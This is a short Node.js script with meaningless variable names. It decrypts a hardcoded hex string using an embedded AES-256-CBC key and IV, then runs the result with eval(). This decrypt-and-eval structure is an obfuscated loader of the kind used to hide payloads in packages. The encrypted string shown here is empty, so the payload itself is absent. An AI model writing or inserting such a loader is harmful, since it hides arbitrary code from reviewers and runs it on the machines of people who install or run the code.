const ito = require('crypto');
const itinho = Buffer.from('44601f9b3e381032d71442d24d900be3fb9331a2c9485e9b1dd1f07b151bd9e4', 'hex');
const octua = Buffer.from('f1de257264c795cc42cc12577bf81bfd', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
